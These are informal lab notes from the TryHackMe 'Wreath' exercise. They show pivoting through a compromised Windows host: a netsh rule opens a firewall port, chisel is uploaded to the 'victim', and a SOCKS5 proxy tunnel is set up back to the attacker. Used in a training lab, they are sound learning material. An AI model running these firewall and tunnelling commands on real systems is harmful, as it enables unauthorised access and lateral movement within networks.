We have two immediate options for this: Chisel, and Plink but but but i got a new tool recommendation today so will try to do pivoting with it rather than these tools.

So for now i will go with chisel forwards proxy as we have used the sshuttle already to connect with the git web server.

```
netsh advfirewall firewall add rule name="NAME" dir=in action=allow protocol=tcp localport=PORT
```

```
netsh advfirewall firewall add rule name="Chisel-Sardarji" dir=in action=allow protocol=tcp localport=47000
```

```
upload /root/TryHackMe/Wreath/chisel_win.exe
```
Will simply upload the chisel.exe on the victim so that we can start the server on it and listen the traffic on our side which is the attacker.

And we already have opened the firewall port on the victim machine so that we can start the proxy

```
./chisel_win.exe server -p 47000 --socks5
```

```
chisel client 10.200.101.150:47000 9090:socks
```

We have to setup a proxy after setting the chisel and take care that i have used http and was not able to go further yesterday and was able to caught my mistake.
